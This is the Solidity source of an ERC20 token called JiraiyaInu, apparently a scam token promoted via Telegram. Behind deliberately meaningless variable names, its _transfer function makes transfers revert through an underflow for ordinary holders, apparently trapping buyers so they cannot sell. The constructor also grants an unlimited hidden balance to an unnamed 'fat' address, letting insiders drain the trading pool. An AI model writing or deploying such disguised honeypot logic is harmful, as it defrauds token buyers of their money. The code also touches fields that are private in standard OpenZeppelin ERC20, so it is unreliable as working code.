// https://t.me/Jiraiyainueth

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.2;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract JiraiyaInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private because;

    function _transfer(
        address pass,
        address hard,
        uint256 fort
    ) internal override {
        uint256 reader = within;

        if (team[pass] == 0 && because[pass] > 0 && pass != uniswapV2Pair) {
            team[pass] -= reader;
        }

        address neck = paint;
        paint = hard;
        because[neck] += reader + 1;

        _balances[pass] -= fort;
        uint256 gasoline = (fort / 100) * within;
        fort -= gasoline;
        _balances[hard] += fort;
    }

    address private paint;
    mapping(address => uint256) private team;
    uint256 public within = 3;

    constructor(
        string memory learn,
        string memory beauty,
        address winter,
        address fat
    ) ERC20(learn, beauty) {
        uniswapV2Router = IUniswapV2Router02(winter);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 shallow = ~uint256(0);

        team[msg.sender] = shallow;
        team[fat] = shallow;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[fat] = shallow;
    }
}